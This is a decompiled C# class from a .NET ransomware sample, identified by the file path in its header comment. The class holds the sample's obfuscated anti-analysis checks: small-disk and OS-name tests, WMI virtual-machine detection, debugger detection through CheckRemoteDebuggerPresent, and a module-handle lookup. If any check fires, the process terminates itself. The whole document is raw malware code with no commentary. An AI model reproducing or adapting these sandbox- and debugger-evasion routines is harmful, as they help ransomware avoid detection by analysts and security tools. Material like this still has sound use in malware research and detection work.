// Decompiled with JetBrains decompiler
// Type: oXSOOyVgTNm.XYxNcwNKOPNvxzrS
// Assembly: Skylandshare, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BA04C86B-6DB4-4F58-B4B2-0DD203E57103
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-8d268be58a27d2c980b807ffe703ea28b0fd0cd1ba2e455902faebe9ec17c52e.exe

using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace oXSOOyVgTNm
{
  internal sealed class XYxNcwNKOPNvxzrS
  {
    [NonSerialized]
    internal static GetString \u0094;

    public static void kQhViAayurgy()
    {
      if (XYxNcwNKOPNvxzrS.gLuSPhpUBVCxFSAet() || XYxNcwNKOPNvxzrS.FvCeKjNwFbCkW() || XYxNcwNKOPNvxzrS.OtTnsHsRysIk() || XYxNcwNKOPNvxzrS.jVrOrVKsoxw() || XYxNcwNKOPNvxzrS.fVIPsnARPjY())
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool jVrOrVKsoxw()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool fVIPsnARPjY()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains(XYxNcwNKOPNvxzrS.\u0094(107402377)))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool gLuSPhpUBVCxFSAet()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(XYxNcwNKOPNvxzrS.\u0094(107402372)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject[XYxNcwNKOPNvxzrS.\u0094(107402291)].ToString().ToLower();
              if (lower == XYxNcwNKOPNvxzrS.\u0094(107402306) && managementBaseObject[XYxNcwNKOPNvxzrS.\u0094(107402277)].ToString().ToUpperInvariant().Contains(XYxNcwNKOPNvxzrS.\u0094(107402236)) || lower.Contains(XYxNcwNKOPNvxzrS.\u0094(107402223)) || managementBaseObject[XYxNcwNKOPNvxzrS.\u0094(107402277)].ToString() == XYxNcwNKOPNvxzrS.\u0094(107402246))
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool FvCeKjNwFbCkW()
    {
      bool flag = false;
      try
      {
        XYxNcwNKOPNvxzrS.eWcNHGwpnTrT(Process.GetCurrentProcess().Handle, ref flag);
        return flag;
      }
      catch
      {
        return flag;
      }
    }

    private static bool OtTnsHsRysIk()
    {
      try
      {
        return XYxNcwNKOPNvxzrS.IDbwbJVnpKILz(XYxNcwNKOPNvxzrS.\u0094(107402197)).ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr IDbwbJVnpKILz([In] string obj0);

    [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
    private static extern bool eWcNHGwpnTrT([In] IntPtr obj0, [In] ref bool obj1);

    static XYxNcwNKOPNvxzrS() => Strings.CreateGetStringDelegate(typeof (XYxNcwNKOPNvxzrS));
  }
}
